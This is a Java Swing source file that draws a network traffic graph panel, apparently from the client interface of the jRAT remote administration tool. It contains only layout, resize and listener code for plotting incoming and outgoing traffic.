package se.jrat.client.ui.panels;

import java.awt.event.ComponentEvent;
import java.awt.event.ComponentListener;

import javax.swing.JPanel;

import se.jrat.client.listeners.NetworkMonitorListener;
import se.jrat.client.threads.RunnableNetworkCounter;

import com.redpois0n.graphs.network.NetworkColors;
import com.redpois0n.graphs.network.NetworkGraph;

@SuppressWarnings("serial")
public class PanelMainNetwork extends JPanel {

	private NetworkGraph graph;

	private int width = 630;
	private int height = 320;

	private boolean initialized;
	
	private Listener listener = new Listener();

	public PanelMainNetwork() {
		init();
	}

	public void init() {
		setLayout(null);

		if (!initialized) {
			initialized = true;

			graph = new NetworkGraph(new NetworkColors());

			add(graph);
		}

		graph.setBounds(5, 5, this.getWidth() - 5, this.getHeight() - 5);

		addComponentListener(new ComponentListener() {

			@Override
			public void componentResized(ComponentEvent e) {
				boolean b = width == getWidth() && height == getHeight();
				width = getWidth();
				height = getHeight();

				if (!b) {
					init();
				}
			}

			@Override
			public void componentHidden(ComponentEvent arg0) {

			}

			@Override
			public void componentMoved(ComponentEvent arg0) {

			}

			@Override
			public void componentShown(ComponentEvent arg0) {

			}
		});
	}

	public void setActive(boolean b) {
		if (b) {
			RunnableNetworkCounter.addListener(listener);
		} else {
			RunnableNetworkCounter.removeListener(listener);
		}
	}
	
	class Listener implements NetworkMonitorListener {
		@Override
		public void onUpdate(int out, int in) {
			graph.addValues(in, out);	
		}
	}
}